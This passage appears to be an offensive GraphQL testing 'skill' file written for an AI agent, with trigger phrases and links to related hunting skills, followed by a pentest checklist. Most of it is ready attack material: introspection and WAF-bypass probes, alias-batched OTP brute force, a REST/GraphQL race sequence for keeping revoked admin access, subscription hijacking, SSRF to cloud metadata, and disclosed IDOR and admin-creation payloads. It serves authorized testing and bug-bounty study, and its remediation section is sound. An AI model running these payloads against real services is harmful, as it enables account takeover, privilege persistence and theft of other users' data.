          kind
        }
      }
    }
  }
}
```

**Minimal Introspection Probe (bypass attempt):**
```graphql
{ __typename }
```

**curl introspection test:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

**Field suggestion probe (bypass blind introspection blocks):**
```graphql
{ unknownField }
```
If response returns `"Did you mean: [realFieldName]?"` — schema is enumerable despite introspection being disabled.

**Batch query amplification:**
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```

**Subscription hijacking (cross-user channel access):**
```graphql
subscription { messageAdded(channelId: "OTHER_USERS_CHANNEL") { content sender { email } } }
```
If subscriptions lack per-user scoping, an attacker can receive real-time events from another user's channel or conversation.

**Multi-code OTP/2FA brute-force via alias batching:**
```graphql
mutation { 
  v1: verifyOtp(code:"000001"){token} 
  v2: verifyOtp(code:"000002"){token}
  v3: verifyOtp(code:"000003"){token}
}
```
A single GraphQL request aliases the same mutation with different OTP codes. Combined with parallel HTTP, this defeats per-request rate limiting and compresses brute-force attempts into fewer network round-trips.

**RC desync test pattern (pseudo-sequence):**
```bash

# Step 1: Grant access via REST
curl -X PUT https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN" \
  -d '{"permission":"admin"}'

# Step 2: Revoke via REST  
curl -X DELETE https://api.target.com/repos/ORG/REPO/teams/TEAM \
  -H "Authorization: token ADMIN_TOKEN"

# Step 3: Re-assert via GraphQL mutation
curl -X POST https://api.target.com/graphql \
  -H "Authorization: bearer ATTACKER_TOKEN" \
  -d '{"query":"mutation { updateTeamsRepository(input: {repositoryId: \"REPO_ID\", teamId: \"TEAM_ID\", permission: ADMIN}) { clientMutationId } }"}'

# Step 4: Verify persistent access
curl https://api.target.com/repos/ORG/REPO/teams \
  -H "Authorization: token ADMIN_TOKEN"
```

**Grep for GraphQL in JS bundles:**
```bash
grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
```

**GraphQL introspection & audit tooling:**
```bash

# InQL (Burp extension) — visualize GraphQL schema and relationships
inql -t https://target/graphql --generate-queries

# Clairvoyance — brute-force field names when introspection is disabled
python3 clairvoyance.py -u https://target/graphql -H "Authorization: Bearer TOKEN" -w wordlist.txt -o schema.json

# GraphQL Cop — scan for common misconfigurations (introspection enabled, no depth limits, etc.)
graphql-cop -t https://target/graphql
```

---

## Common Root Causes

1. **Dual-write without atomic locking** — developers implement the same resource modification in both REST and GraphQL independently. Neither system is aware the other exists for that resource. State updates aren't serialized or compared.

2. **Inconsistent authorization middleware** — REST endpoints go through one auth layer (e.g., middleware chain), GraphQL resolvers go through a different resolver-level check. The same action, different enforcement.

3. **GraphQL as "new REST" migration** — teams add GraphQL mutations that mirror REST functionality without auditing the permission model. The GraphQL version is less mature and skips checks the REST version accumulated over time.

4. **Introspection left on in production** — default framework settings (Apollo, Graphene) enable introspection in all environments. Developers forget to disable it, treating it as "just documentation."

5. **Node ID trust without re-authorization** — GraphQL global IDs (`base64("ObjectType:123")`) are decoded and trusted without verifying the requesting user has access to that specific object.

6. **Mutation side effects not mirrored** — when a REST action triggers cascading effects (e.g., team removal cascades to permission revocation), the GraphQL equivalent mutation doesn't trigger the same cascades.

---

## Bypass Techniques

**Defense: Introspection disabled**
- Bypass via field suggestion errors — send invalid field names and parse "did you mean X?" responses
- Use `clairvoyance` to brute-force field names against a wordlist
- Check JS bundles for hardcoded query strings that reveal the schema

**Defense: Depth limiting**
- Fragment spread to increase effective depth without hitting the limiter:
```graphql
fragment F on User { repos { teams { members { ...F } } } }
```

**Defense: Rate limiting per IP**
- Use batch operations (array of queries in one POST)
- Distribute across authenticated sessions

**Defense: Auth checks on mutations**
- Test with tokens at different privilege tiers (viewer, member, admin)
- Test unauthenticated — some mutations don't check session at all
- Test with tokens from *different organizations* — multi-tenant IDOR

**Defense: WAF blocking `__schema`**
- Alias the introspection field:
```graphql
{ s: __schema { t: types { n: name } } }
```
- Use HTTP parameter pollution or alternate content-type headers

**Defense: Operation whitelisting (persisted queries)**
- Check if the server falls back to ad-hoc queries when the `extensions.persistedQuery` hash mismatches
- Look for a non-whitelisted endpoint (dev, staging, internal proxy)

### Alias batching: when it wins races vs when it doesn't

A common claim is "alias batching defeats per-user rate limits and double-spend protections." Whether this actually wins depends on the **resolver execution model**:

| Resolver type | Behavior on aliased mutations | Alias batching wins races? |
|---|---|---|
| Multi-threaded / `DataLoader`-batched async | Aliases run concurrently, share state via batch | **YES** — single HTTP request can amplify a race-target N times |
| Single-threaded / single-DB-connection per request | Aliases run serially; first mutation closes the door | **NO** — combine with parallel HTTP |
| Distributed gateway (Apollo Federation) | Sub-queries dispatched concurrently to subgraphs | Depends on each subgraph |

**Verification example (single-threaded Flask + SQLite resolver):**
- 10 aliased `redeemCoupon` mutations in one request → only `r1` succeeds, r2-r10 fail with `already_redeemed`. Alias batching alone is insufficient.
- The same 10 mutations as **20 parallel HTTP POSTs** → 20 successes ($2000 from a $100 coupon).

**Operator rule:** treat alias batching as a single-RTT recon primitive. For race-target exploitation, combine with `hunt-race-condition`'s parallel-HTTP / Turbo Intruder single-packet attack. Verified in `docs/verification/phase2e-jwt-graphql-race.md` Test 11 vs Test 12.

---

## Gate 0 Validation

1. **What can the attacker DO right now?**
   Must be a concrete action: access data they shouldn't see, retain privileges after revocation, modify another user's resources. "The schema is visible" alone is not enough — what does the schema unlock?

2. **What does the victim LOSE?**
   Must be a real asset: data confidentiality, access control integrity, org security guarantees. For the RC pattern: an org admin loses the guarantee that removing a team revokes all access. That's a security contract violation.

3. **Can it be reproduced in 10 minutes from scratch?**
   For RC/desync bugs: write the exact curl sequence. Run it twice. If the privilege persists deterministically (not timing-dependent flakiness), it's reportable. If it requires millisecond timing luck, document the window and test on low-load times.

---

## Real Impact Examples

**Scenario A — Covert Persistent Admin After Team Removal (GitHub-pattern)**
An attacker who legitimately had admin access to a repository via team membership gets removed by the org admin through the REST API. The attacker, before removal completes, calls the `updateTeamsRepository` GraphQL mutation to re-associate their team with admin permissions. The REST removal and GraphQL re-grant create a desync where the UI shows the team as removed, but the GraphQL state preserves admin-level access. The attacker retains covert write access to the repository indefinitely — pushing code, reading secrets in CI/CD — without appearing in the team's member list. This persists through org audits.

**Scenario B — Covert Access via Repo Transfer Race (GitHub-pattern)**
An attacker with admin access initiates a repository transfer to another organization via the REST API. During or after the transfer, they invoke `updateTeamsRepository` on the now-transferred repo's ID. Because the GraphQL mutation doesn't validate current org ownership state consistently with the REST transfer event, the original attacker's team retains admin access on a repo now owned by a different organization. The receiving org has no visibility into this team association. The attacker can exfiltrate intellectual property from an org they have no legitimate relationship with.

**Scenario C — Introspection as Reconnaissance Prerequisite (Shopify-pattern)**
On a platform where introspection is intentionally enabled (per-program rules), a hunter maps the full schema and discovers undocumented mutations for `fulfillmentOrderMove` and `inventoryAdjust` that are not surfaced in public docs. These mutations accept merchant IDs as arguments with no scoping validation visible in the schema. This recon directly enables targeted IDOR testing against merchant-to-merchant data isolation — the introspection itself is zero-severity, but it is the entry point to critical findings.

---

## Disclosed Report Citations (Backfill +9 — 2019-2024)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill beyond the original 3 internal references. Each is a distinct GraphQL subclass with a working PoC documented in the cited writeup.

4. **HackerOne — Confidential user-data exposure via GraphQL `User` type** ([H1 #489146](https://hackerone.com/reports/489146))
    - Subclass: broken field-level authorization (PII exposure)
    - Payload: direct `user(id:...)` query returning `email`, `backup_codes_hash`, `facebook_user_id`, `account_recovery_phone_number_verified_at`, `totp_enabled`
    - Root cause: backend migration introduced a GraphQL `User` type with no field-level authz; any authenticated user could enumerate PII of all users
    - Year: 2019 — **$20,000**, 1,028 upvotes

5. **HackerOne — `DestroyLlmConversation` mutation IDOR (Copilot pre-release)** ([H1 #2218334](https://hackerone.com/reports/2218334))
    - Subclass: mutation IDOR on AI/LLM feature
    - Payload: `mutation { destroyLlmConversation(input:{id:"<victim_conv_id>"}) { … } }`
    - Root cause: new LLM-conversation mutation shipped without authorization decorator; any user could destroy any conversation
    - Year: 2023 — caught pre-launch, no bounty (202 upvotes)

6. **Shopify — `BillingDocumentDownload` cross-tenant IDOR** ([H1 #2207248](https://hackerone.com/reports/2207248))
    - Subclass: IDOR on relay GID across tenants
    - Payload: `query { billingDocumentDownload(id:"gid://shopify/BillingInvoice/<other_shop_id>") { url } }`
    - Root cause: `BillingInvoice` resolver authorized the requester's shop but did not verify the invoice belonged to that shop
    - Year: 2024 — **$5,000**, 175 upvotes

7. **Shopify — Rate-limit bypass via negative cost** ([H1 #481518](https://hackerone.com/reports/481518))
    - Subclass: query-cost-calc abuse (sibling pattern to alias batching)
    - Payload: `query { products(first:-100) { … } }` — negative `first` produced a negative query-cost contribution, refilling the leaky-bucket each call
    - Root cause: query-cost calculator did not floor at zero; negative values subtracted from the consumed budget
    - Year: 2019 — **$1,000**

8. **Stripe — Cross-tenant IDOR via `UpdateAtlasApplicationPerson`** ([H1 #1066203](https://hackerone.com/reports/1066203))
    - Subclass: cross-tenant IDOR on mutation
    - Payload: `mutation { updateAtlasApplicationPerson(input:{personId:"<victim_person_id>", …}) }` — adding/modifying a co-founder on another merchant's Stripe Atlas application
    - Root cause: mutation scoped only to "is admin of some merchant," not "is admin of the merchant owning this person"
    - Year: 2020 — bounty undisclosed (resolved)

9. **EXNESS — SSRF in GraphQL `allTicks` query** ([H1 #1864188](https://hackerone.com/reports/1864188))
    - Subclass: SSRF via GraphQL argument
    - Payload: `query { allTicks(source:"http://169.254.169.254/latest/meta-data/") { … } }` — `source` arg fed into a server-side HTTP client
    - Root cause: GraphQL field accepted a URL arg and dereferenced it without scheme/host allowlist
    - Year: 2023 — **$3,000**, 249 upvotes

10. **EXNESS — GraphQL attribute-batching DoS** ([H1 #2293642](https://hackerone.com/reports/2293642))
    - Subclass: DoS via batching / deep-attribute amplification on unauth endpoint
    - Payload: single HTTP request containing N batched operations, each requesting deeply nested attribute trees, sustained until origin OOM
    - Root cause: no query-depth, query-complexity, or batch-size limits on unauthenticated `/graphql`
    - Year: 2024 — bounty undisclosed (resolved)

11. **GitLab — Malicious-runner attach via `runnerUpdate` (CVE-2023-2478)** ([Advisory](https://about.gitlab.com/releases/2023/05/05/critical-security-release-gitlab-15-11-2-released/))
    - Subclass: auth bypass on mutation / project-scope missing
    - Payload: `mutation { runnerUpdate(input:{id:"<attacker_runner_gid>", associatedProjects:["<victim_project_gid>"]}) }`
    - Root cause: `runnerUpdate` did not check that the caller had Maintainer on the target project — any user could bind their malicious runner and intercept CI jobs (build secrets, code execution)
    - Year: 2023 — Critical, CVSS 9.6 (H1 bounty undisclosed; GitLab Critical-tier typically $20k–$35k)

12. **AS Watson — Auth bypass via unrestricted `createAdminUser` mutation** ([HackerOne blog](https://www.hackerone.com/blog/how-graphql-bug-resulted-authentication-bypass))
    - Subclass: sensitive mutation reachable without authentication (introspection-aided discovery)
    - Payload: `mutation { createAdminUser(input:{email:"x@x", role:"ADMIN", password:"…"}) { token } }` invoked unauthenticated after schema enumeration via introspection
    - Root cause: schema lacked per-field authorization directives; `createAdminUser` exposed to public role
    - Year: 2023 — "Best Bug" prize at HackerOne Ambassador World Cup

---

## Related Skills & Chains

- **`hunt-idor`** — GraphQL `node(id:)` and global-relay-ID resolvers are IDOR factories: same shape, no scoping. Chain primitive: GraphQL introspection + IDOR (`node()` resolver) → cross-tenant data via base64-decoded type:id replay.
- **`hunt-api-misconfig`** — GraphQL mutations are mass-assignment magnets: clients send full input objects, server merges. Chain primitive: GraphQL mutation + extra fields (`isAdmin:true`, `verified:true`) → mass assignment → role escalation.
- **`hunt-business-logic`** — GraphQL aliases let you call the same mutation N times in one request, defeating per-request rate limits. Chain primitive: aliased mutation + business-logic flaw → coupon redeemed N times in single network round-trip.
- **`hunt-race-condition`** — GraphQL batching collapses N mutations into one HTTP packet — perfect single-packet race vehicle. Chain primitive: GraphQL batch + race → atomic-update missing → double-spend balance.
- **`security-arsenal`** — Load the GraphQL Payload Pack: introspection query, schema-suggestion error probe, alias amplification template, depth-bomb DoS payload, batch-attack template.
- **`triage-validation`** — Apply the Body-Diff Rule: introspection alone is informational; require a concrete cross-tenant read or mutation-with-impact PoC before submitting.


## SOURCE: offensive-skills/offensive-graphql/SKILL.md

## Metadata
- **Skill Name**: graphql-security
- **Folder**: offensive-graphql
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/graphql.md

## Description
GraphQL security testing checklist: introspection abuse, batching attacks, query depth/complexity DoS, field suggestion enumeration, IDOR via GraphQL, injection through arguments, authorization bypass. Use when assessing GraphQL endpoints in web app tests or bug bounty.

## Trigger Phrases
Use this skill when the conversation involves any of:
`GraphQL, introspection, batching attack, query depth, GraphQL injection, GraphQL IDOR, field suggestion, GraphQL auth bypass, GraphQL DoS, GraphQL security`

## Shortcut

1.  Identify GraphQL Endpoint: Look for common paths like `/graphql`, `/graphiql`, `/graphql.php`, `/graphql/console`. Check network requests in browser developer tools.
2.  Introspection Query: Send an introspection query to fetch the schema. Tools like GraphiQL or Postman can help. `query={__schema{types{name}}}`
3.  Analyze Schema: Look for sensitive types, fields, mutations, and subscriptions. Pay attention to authorization logic.
4.  Test Queries/Mutations:
    - Check for Information Disclosure (e.g., user data, configuration).
    - Test for Authorization Bypass (IDOR, insufficient permission checks).
    - Look for Injection (SQLi, NoSQLi, Command Injection) in input fields.
    - Test for Denial of Service (complex/deeply nested queries, batching abuse).
    - Explore Mutations for unintended state changes.
    - Check Subscriptions for data leakage.
    - Verify persisted/signed queries enforced in production; depth/complexity limits.
5.  No Introspection? Try common field/type guessing (e.g., `user`, `admin`, `query`, `mutation`). Use tools like `clairvoyance` or `inql`.

## Mechanisms

- Over-Fetching: Clients can request excessive data, potentially leading to DoS or information disclosure if not properly limited.
- Under-Fetching/N+1 Problem: Primarily a performance issue—poorly designed resolvers make dozens of backend calls (N+1). While not a direct data‑exposure risk, extreme latency can create timing side‑channels an attacker could measure.
- Insecure Direct Object References (IDOR): Exposing internal IDs allows attackers to potentially access unauthorized data by guessing/enumerating IDs.
- Insufficient Authorization: Missing or flawed checks on types, fields, mutations, or subscriptions.
- Input Validation Issues: Failure to sanitize or validate user input can lead to injection attacks (SQLi, NoSQLi, XSS, SSRF) if resolvers interact with backend systems insecurely.
- Introspection Enabled in Production: Exposes the entire schema, simplifying reconnaissance for attackers.
- Batching Abuse: Sending multiple queries/mutations in a single request can overwhelm the server (DoS) or bypass rate limiting.
- Lack of Depth/Complexity Limiting: Allows excessively nested or complex queries, leading to DoS.
- Directive Flooding: Sending thousands of `@include`/`@skip` directives in a single query can exhaust parser and validation phases, triggering DoS (e.g., CVE‑2024‑47614 in async‑graphql).
- Incremental Delivery: `@defer`/`@stream` can multiply work and leak partial data; must be guarded by cost and auth checks on deferred subtrees.
- File Uploads: Implementations using `graphql-upload` or custom multipart handling can inherit classic upload bugs (path traversal, content-type trust, temp file exposure).
- Federation/Gateway: Cross-subgraph authorization gaps, entity resolver overfetching, and inconsistent role enforcement at the router vs. subgraphs.
- CSRF Considerations: If cookie‑based auth is used, enforce header + `Origin` validation; prefer Authorization header.
- WebSocket Security: GraphQL subscriptions over WebSocket often lack proper authorization on long-lived connections; auth tokens in connection params may not be re-validated after expiry.
- Field Suggestions: Error messages that suggest valid field names when invalid ones are queried can leak schema information even with introspection disabled.
- Relay Global IDs: Base64-encoded `Type:ID` patterns (e.g., `base64("User:123")`) are commonly used and can be decoded to reveal internal IDs.
- Apollo/Hasura Leaks: Production Apollo Server instances may leak schema via query extensions; Hasura permissions misconfiguration can expose direct DB access.
- Header Injection: `x-hasura-*` headers or custom auth headers may be trusted without validation, enabling privilege escalation.

### Preparation

- Identify the GraphQL endpoint(s).
- Obtain the schema via introspection or guessing.
- Understand the application context and potential sensitive data/actions.

### Techniques

- Schema Analysis: Use tools like `GraphQL Voyager` or manually review the schema for sensitive keywords (`admin`, `password`, `config`, `secret`), authorization directives, and complex relationships.
- Query Fuzzing: Use tools like `inql` or custom scripts to fuzz queries, mutations, and arguments.
- Authorization Testing:
  - Try accessing data/mutations meant for higher-privileged users.
  - Test IDOR by replacing IDs in queries/mutations.
  - Check if different roles see different schema subsets (if applicable).
  - Verify router and subgraphs enforce identical authz decisions.
- Injection Testing: Inject payloads (SQL, NoSQL, OS command, XSS, SSRF) into string arguments.
- DoS Testing:
  - Deeply nested queries (`query { user { friends { friends { ... } } } }`).
  - Large limits in list arguments (`query { users(limit: 99999) { id } }`).
  - Query batching abuse.
  - Field duplication/aliases (`query { u1: user(id:1){id} u2: user(id:1){id} ... }`).
  - Directive flooding by attaching a very long chain of `@include` or `@skip` directives to safe fields.
- Incremental delivery pressure: attach many `@defer`/`@stream` segments to expand compute and memory footprint.
- Business Logic Flaws: Test mutations for race conditions, logical errors, or unintended side effects.
- Upload testing: multipart spec edge cases (path traversal via `map`, temp file exposure) and file‑type checks.
- WebSocket Subscription Testing:
  - Tamper with `connection_init` payload (JWT in `connectionParams`)
  - Test subscription flooding without rate limiting
  - Verify auth token expiry is enforced on long-lived WS connections
  - Test for cross-user subscription leaks via predictable subscription IDs
- Field Suggestion Probing: Send invalid field names and analyze error messages for schema hints ("Did you mean...?" responses)
- Relay ID Decoding: Identify base64-encoded global IDs (e.g., `id: "VXNlcjoxMjM="`), decode to extract type and numeric ID, test IDOR
- Apollo Extensions: Try `?extensions={"persistedQuery":{...}}` or check for `apollo-server-testing` header in responses
- Hasura Header Injection: Test `x-hasura-role`, `x-hasura-user-id`, `x-hasura-org-id` headers for authorization bypass

### Advanced Testing

- Reverse engineer client-side code making GraphQL requests.
- Analyze traffic between microservices if GraphQL is used internally.
- Test subscription endpoints for authorization issues and data leakage over time.

### Introspection Disabled

Use wordlists (SecLists has GraphQL lists) with tools like `clairvoyance` or `GraphQLmap` to guess types, fields, and arguments. Analyze client-side code for hints.

- Quick probe: `query { __typename }` often succeeds even when full introspection is disabled and confirms a GraphQL endpoint.

- Use wordlists (SecLists has GraphQL lists) with tools like `clairvoyance` or `GraphQLmap` to guess types, fields, and arguments. Analyze client-side code for hints.

### Rate Limiting/Complexity Limits

- Use aliases to request the same field multiple times within limits.
- Split complex queries into multiple smaller ones.
- Abuse batching if not properly limited.

### Web Application Firewalls (WAFs)

- Use GraphQL query variations (aliases, fragments, different whitespace).
- Encode payloads within strings.
- Leverage nested input objects if WAF only inspects top-level arguments.
- Abuse incremental delivery: place sensitive fields under `@defer` to evade naive complexity calculators.
- Persisted queries reduce WAF reliance; prefer signature enforcement at edge.

### Common Patterns

- Publicly exposed GraphiQL interface with introspection enabled.
- Mutations lacking proper authorization checks.
- Resolvers directly using user input in database queries or system commands.
- Fields returning sensitive information not intended for the user's role.
- Lack of query depth/complexity/limit controls.

### Specific Functions/Areas:

- `user`, `account`, `profile` types/queries (Information Disclosure, IDOR).
- `admin`, `settings`, `config` types/queries (Privilege Escalation).
- Mutations involving payments, data modification, or user management.
- Search functionalities (Injection).
- File upload mechanisms via mutations.
- Subscription endpoints.

### Tools

- Automated Scanners: `StackHawk`, `Invicti`, **Escape** (free SaaS tier), `Nuclei` (GraphQL templates).
- Introspection & Interaction: `GraphiQL`, `Postman`, `Altair GraphQL Client`, `Insomnia`.
- Schema Exploration: `GraphQL Voyager`.
- Exploitation/Fuzzing: `inql` (Burp Suite Extension), `GraphQLmap`, `clairvoyance`, **CrackQL** (JWT extraction from errors), **BatchQL** (batch query fuzzing), custom Python scripts (`requests` library).
- Proxy: Burp Suite, OWASP ZAP (to intercept and modify requests).
- Security Middleware: **GraphQL Armor** – production‑ready depth, alias and complexity limits for Apollo Server, Yoga, Envelop and more.
- Fingerprinting / Recon: **graphw00f** – identifies the underlying GraphQL implementation (Apollo, Yoga, Hasura, etc.) to tailor attacks.
- Security Auditing: **graphql-cop** – security auditing and configuration checking.
- Endpoint Discovery: `Graphinder` and wordlists for path guessing.
- Linters/Policy: `graphql-schema-linter`, `eslint-plugin-graphql`, and custom auth directives unit tests.

### Systematic Process

1.  Reconnaissance (Endpoint discovery, Schema retrieval/guessing).
2.  Schema Analysis (Identify key types, fields, mutations, auth).
3.  Authorization Testing (Role-based access, IDOR).
4.  Input Vulnerability Testing (Injection, XSS, SSRF in arguments).
5.  DoS Testing (Query complexity, batching, limits).
6.  Business Logic Testing (Mutation side-effects, race conditions).
7.  Subscription Testing (if applicable).

### High-Impact Targets

Mutations changing state (user roles, passwords, settings), queries accessing sensitive user data, administrative endpoints.

## Chaining and Escalation

- **IDOR + Mutation**: Discover an IDOR in a query, then use the leaked ID to modify another user's data via a mutation (e.g., change email/password).
- **Information Disclosure + Injection**: Leak database structure/version via a verbose error, then use that info to craft a targeted SQLi payload.
- **SSRF + Internal Endpoint**: Use an SSRF vulnerability in a resolver to interact with internal GraphQL endpoints or other services not directly accessible.
- **Authorization Bypass + Admin Mutation**: Gain access to an administrative mutation (e.g., `updateUserRole`) through flawed authorization, then escalate privileges.
- **XSS + Token Theft**: Inject XSS payload via a vulnerable field, steal authentication tokens from other users viewing the data.

## Remediation Recommendations

- Disable Introspection in Production: Prevent easy schema discovery.
- Implement Strict Authorization: Apply checks at the schema level (directives) and within resolvers for every field, type, mutation, and subscription based on user roles/permissions. Use context passed to resolvers.
- Input Validation & Sanitization: Validate all arguments against expected types, formats, and lengths. Sanitize input before using it in downstream systems (databases, commands). Use parameterized queries.
- Query Cost Analysis: Implement limits on query depth, complexity (e.g., maximum nodes or calculated cost), and amount (limit number of results).
- Rate Limiting: Limit the number of requests per user/IP, including batched queries.
- Persisted & Signed Queries: Enforce automatic persisted queries (APQ) with operation signatures to whitelist allowed operations and block unknown or modified queries.
- Secure Federation Gateways: Keep Apollo Router (or your GraphQL gateway) patched, validate supergraph composition, and enforce authorization at the gateway layer to prevent cross‑subgraph data leaks.
- Caching & CDN Hardening: If responses are cached, partition caches by the `Authorization` header (or disable caching) to avoid shared‑cache data leakage.
- Specific Field Exposure: Avoid exposing sensitive fields (`password`, `internal tokens`). Use dedicated Data Transfer Objects (DTOs) if necessary.
- Error Handling: Return generic error messages; avoid leaking stack traces or internal details.
- Regular Audits & Testing: Perform regular security reviews and penetration tests specifically targeting the GraphQL API.
- Use Security Headers: Apply standard web security headers (CSP, HSTS, etc.).
- Keep Libraries Updated: Ensure GraphQL server libraries and dependencies are patched.
- Incremental Delivery Controls: enforce cost accounting for `@defer`/`@stream`; ensure deferred subtrees still run full auth/visibility checks.
- File Upload Hygiene: if using GraphQL upload, re‑encode images, validate content by signature, and store outside web root; apply all controls from `file-upload.md`.
- Federation RBAC: centralize auth policy in schema directives evaluated at the gateway and in subgraphs; avoid trusting upstream filtering blindly.
